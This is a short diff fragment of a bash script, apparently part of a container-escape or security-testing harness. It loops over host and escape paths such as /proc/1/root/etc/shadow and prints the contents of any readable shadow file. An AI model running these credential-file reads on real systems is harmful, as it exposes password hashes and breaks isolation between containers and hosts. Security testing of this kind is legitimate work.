@@ -434,15 +434,9 @@ EOFBASH
       echo "[*] Combining all discovered techniques for final shadow access..."
       
       # Try every possible path and method we discovered
-      shadow_paths=(
-        "/etc/shadow"
-        "/proc/1/root/etc/shadow"
-        "/proc/self/root/etc/shadow"
-        "/tmp/escape/etc/shadow"
-        "/mnt/host/1/root/etc/shadow"
-      )
+      shadow_found=false
       
-      for shadow_path in "$${shadow_paths[@]}"; do
+      for shadow_path in "/etc/shadow" "/proc/1/root/etc/shadow" "/proc/self/root/etc/shadow" "/tmp/escape/etc/shadow" "/mnt/host/1/root/etc/shadow"; do
         if [ -r "$${shadow_path}" ]; then
           echo "[+] 🚨🚨🚨 SHADOW FILE ACCESSIBLE: $${shadow_path}"
           echo "--- SHADOW CONTENTS ---"
